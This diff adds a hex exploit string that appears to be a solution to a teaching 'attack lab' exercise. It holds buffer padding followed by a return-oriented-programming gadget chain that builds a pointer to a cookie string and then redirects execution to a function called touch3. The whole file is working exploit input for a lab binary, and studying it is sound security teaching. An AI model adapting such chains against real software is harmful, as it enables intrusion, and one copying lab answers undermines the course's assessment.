@@ -1,0 +1,20 @@
+00 00 00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+
+08 1a 40 00 00 00 00 00 /* Gadget: movq %rsp, rax */
+28 19 40 00 00 00 00 00 /* Gadget: movq %rax, rdi */
+
+44 19 40 00 00 00 00 00 /* Gadget: pop %rax */
+48 00 00 00 00 00 00 00 /* Gap to the cookie */
+
+b3 19 40 00 00 00 00 00 /* Gadget: movl %eax, edx */
+6a 19 40 00 00 00 00 00 /* Gadget: movl %edx, ecx */
+e7 19 40 00 00 00 00 00 /* Gadget: movl %ecx, esi */
+
+62 19 40 00 00 00 00 00 /* Gadget: lea    (%rdi,%rsi,1),%rax */
+28 19 40 00 00 00 00 00 /* Gadget: movq %rax, rdi */
+
+98 18 40 00 00 00 00 00 /* Address of touch3 + padding for 8 byted of address */
+36 36 36 65 62 31 62 65 00 /* Cookie */
